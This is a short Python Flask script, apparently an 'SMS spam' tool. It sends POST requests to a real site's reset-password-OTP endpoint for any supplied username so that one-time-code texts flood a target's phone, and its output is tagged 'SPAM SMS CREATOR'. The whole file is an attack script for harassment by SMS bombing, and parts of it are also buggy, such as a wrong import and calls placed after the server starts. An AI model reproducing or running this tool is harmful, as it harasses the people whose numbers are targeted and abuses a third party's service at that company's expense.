from flask import Flask
import jsonify, requests, json, time

abin={
"Host": "cmsapi.mapclub.com"}
app = Flask(__name__)
@app.route('/<benjamin>', methods=['GET', 'POST'])
def spam(benjamin):
  data={"username": benjamin}
  spamx = requests.post("https://cmsapi.mapclub.com/api/reset-password-otp",headers=abin,json=data).text
  return(spamx+"SPAM SMS CREATOR : BENJAMIN-CODE")

def sms(benjamin):
  no = str(benjamin)
  data={"username": benjamin}
  wasap = requests.post("https://cmsapi.mapclub.com/api/reset-password-otp",headers=abin,json=data)
  bin = wasap.text
  return(bin+"\nSPAM SMS BY BENJAMIN CODE")
if __name__=='__main__':
 app.run(port=8080, debug=True)
 sms(benjamin)
 time.sleep(2)
 sms(spam)
